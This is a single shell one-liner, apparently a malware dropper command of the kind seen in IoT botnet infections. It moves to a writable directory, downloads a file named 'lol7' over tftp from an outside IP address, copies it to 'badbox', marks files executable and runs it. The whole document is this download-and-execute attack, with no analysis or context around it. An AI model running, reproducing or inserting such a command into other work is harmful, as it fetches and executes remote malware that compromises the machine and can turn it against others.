cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r lol7 -g 89.248.170.218;cat lol7 >badbox;chmod +x *;./badbox
